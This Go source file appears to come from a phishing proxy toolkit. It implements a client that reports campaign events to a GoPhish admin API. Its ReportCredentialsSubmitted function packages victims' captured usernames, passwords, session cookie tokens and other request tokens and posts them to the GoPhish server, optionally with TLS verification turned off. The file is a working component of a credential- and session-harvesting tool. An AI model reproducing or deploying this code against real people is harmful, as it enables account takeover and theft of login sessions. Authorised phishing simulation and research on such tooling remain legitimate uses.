package core

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/url"

	"github.com/go-resty/resty/v2"
)

type GoPhish struct {
	AdminUrl    *url.URL
	ApiKey      string
	InsecureTLS bool
	Sessions bool
}

type ResultRequest struct {
	Address   string `json:"address"`
	UserAgent string `json:"user_agent"`
	Username   string `json:"username"`
	Password string `json:"password"`
	Custom map[string]string `json:"custom"`
	Tokens string `json:"tokens"`
	HttpTokens map[string]string `json:"http_tokens"`
	BodyTokens map[string]string `json:"body_tokens"`
}

func NewGoPhish() *GoPhish {
	return &GoPhish{}
}

func (o *GoPhish) Setup(adminUrl string, apiKey string, insecureTLS bool, gophishSessions bool) error {

	var u *url.URL = nil
	var err error
	if adminUrl != "" {
		u, err = url.ParseRequestURI(adminUrl)
		if err != nil {
			return err
		}
	}
	o.AdminUrl = u
	o.ApiKey = apiKey
	o.InsecureTLS = insecureTLS
	o.Sessions = gophishSessions
	return nil
}

func (o *GoPhish) Test() error {
	err := o.validateSetup()
	if err != nil {
		return err
	}

	var reqUrl url.URL = *o.AdminUrl
	reqUrl.Path = fmt.Sprintf("/api/campaigns")
	return o.apiRequest(reqUrl.String(), nil)
}

func (o *GoPhish) ReportEmailOpened(rid string, address string, userAgent string) error {
	err := o.validateSetup()
	if err != nil {
		return err
	}

	req := ResultRequest{
		Address:   address,
		UserAgent: userAgent,
	}

	content, err := json.Marshal(req)
	if err != nil {
		return err
	}

	var reqUrl url.URL = *o.AdminUrl
	reqUrl.Path = fmt.Sprintf("/api/results/%s/open", rid)
	return o.apiRequest(reqUrl.String(), content)
}

func (o *GoPhish) ReportEmailLinkClicked(rid string, address string, userAgent string) error {
	err := o.validateSetup()
	if err != nil {
		return err
	}

	req := ResultRequest{
		Address:   address,
		UserAgent: userAgent,
	}

	content, err := json.Marshal(req)
	if err != nil {
		return err
	}

	var reqUrl url.URL = *o.AdminUrl
	reqUrl.Path = fmt.Sprintf("/api/results/%s/click", rid)
	return o.apiRequest(reqUrl.String(), content)
}

func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session, gophishSessions bool) error {
	err := o.validateSetup()
	if err != nil {
		return err
	}

	var req ResultRequest
	if !gophishSessions {
		req = ResultRequest{
			Address:   session.RemoteAddr,
			UserAgent: session.UserAgent,
		}
	} else {
		req = ResultRequest{
			Address:   session.RemoteAddr,
			UserAgent: session.UserAgent,
			Username: session.Username,
			Password: session.Password,
			Custom: session.Custom,
			Tokens: (*Terminal).cookieTokensToJSON(nil, session.CookieTokens),
			HttpTokens: session.HttpTokens,
			BodyTokens: session.BodyTokens,
		}
	}

	content, err := json.Marshal(req)
	if err != nil {
		return err
	}

	var reqUrl url.URL = *o.AdminUrl
	reqUrl.Path = fmt.Sprintf("/api/results/%s/submit", rid)
	return o.apiRequest(reqUrl.String(), content)
}

func (o *GoPhish) apiRequest(reqUrl string, content []byte) error {

	var err error
	var resp *resty.Response
	cl := resty.New()

	cl.SetTLSClientConfig(&tls.Config{
		InsecureSkipVerify: o.InsecureTLS,
	})

	req := cl.R().
		SetHeader("Content-Type", "application/json").
		SetAuthToken(o.ApiKey)

	if content != nil {
		resp, err = req.SetBody(content).Post(reqUrl)
	} else {
		resp, err = req.Get(reqUrl)
	}

	if err != nil {
		return err
	}
	switch resp.StatusCode() {
	case 200:
		return nil
	case 401:
		return fmt.Errorf("invalid api key")
	default:
		return fmt.Errorf("status: %d", resp.StatusCode())
	}
}

func (o *GoPhish) validateSetup() error {
	if o.AdminUrl == nil {
		return fmt.Errorf("admin url is not set")
	}
	if o.ApiKey == "" {
		return fmt.Errorf("api key is not set")
	}
	return nil
}
